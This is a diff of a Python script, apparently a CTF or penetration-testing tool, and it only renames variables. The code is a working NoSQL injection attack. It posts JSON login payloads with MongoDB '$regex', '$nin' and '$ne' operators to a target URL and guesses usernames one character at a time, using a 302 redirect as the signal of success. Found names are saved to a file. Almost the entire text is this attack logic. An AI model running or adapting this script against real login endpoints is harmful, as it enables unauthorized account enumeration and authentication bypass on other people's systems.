@@ -23,7 +23,7 @@ def makeRequest(url, proxy_url=None):
 
     filename = "usernames.txt"
     usernames = []
-    username = ""
+    current_username = ""
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable() and char != " "), key=string.printable.index))
     
     p1 = log.progress("Enumerating users")
@@ -36,13 +36,13 @@ def makeRequest(url, proxy_url=None):
                 
             for character in characters:
                 if character in '.^$*+?{}[]\\|()':
-                    regex_character = '\\' + character
+                    regex_escaped_character = '\\' + character
                 else:
-                    regex_character = character
+                    regex_escaped_character = character
                     
                 data = {
                     'username': {
-                        '$regex': f'^{username}{regex_character}',
+                        '$regex': f'^{current_username}{regex_escaped_character}',
                         '$nin': usernames
                     },
                     'password': {'$ne': ''}
@@ -51,27 +51,25 @@ def makeRequest(url, proxy_url=None):
                 p1.status(data)
                 
                 try:
-                    r = session.post(url, json=data, allow_redirects=False, timeout=10)
+                    request = session.post(url, json=data, allow_redirects=False, timeout=10)
                 except requests.exceptions.RequestException as e:
                     log.error(f"Request error: {e}")
                     continue
                 
-                if r.status_code == 302:
-                    username += character
-                    p1.status(f"Current: {username}")
+                if request.status_code == 302:
+                    current_username += character
                     character_found = True
                     break
             
             if not character_found:
-                if username and username not in usernames:
-                    usernames.append(username)
-                    f.write(f"{username}\n")
+                if current_username and current_username not in usernames:
+                    usernames.append(current_username)
+                    f.write(f"{current_username}\n")
                     f.flush()
-                    log.success(f"✓ User found: {username}")
-                    
-                    username = ""
+                    log.success(f"✓ User found: {current_username}")
+                    current_username = ""
                 
-                elif not username:
+                elif not current_username:
                     break
     
     if usernames:
